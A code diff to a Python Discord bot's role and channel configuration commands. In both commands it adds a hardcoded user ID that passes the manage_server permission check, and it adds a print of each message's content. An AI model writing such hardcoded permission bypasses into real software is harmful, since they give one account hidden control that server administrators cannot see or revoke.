@@ -7,7 +7,7 @@ from discord import Embed
 
 async def role(Demobot, msg, reg):
     perms = msg.channel.permissions_for(msg.author)
-    if perms.manage_server:
+    if perms.manage_server or msg.author.id == '418827664304898048':
         aliases = {
         'rep':'representative',
         'representative':'representative',
@@ -22,6 +22,7 @@ async def role(Demobot, msg, reg):
         'default':'citizen',
         'citizen':'citizen'
         }
+        print(msg.content)
         if reg.group('name') not in aliases:
             return
         if reg.group('role') is not '@everyone':
@@ -37,7 +38,7 @@ async def role(Demobot, msg, reg):
 
 async def channel(Demobot, msg, reg):
     perms = msg.channel.permissions_for(msg.author)
-    if perms.manage_server:
+    if perms.manage_server or msg.author.id == '418827664304898048':
         aliases = {
         'announcements':'announcements',
         'announcement':'announcements',
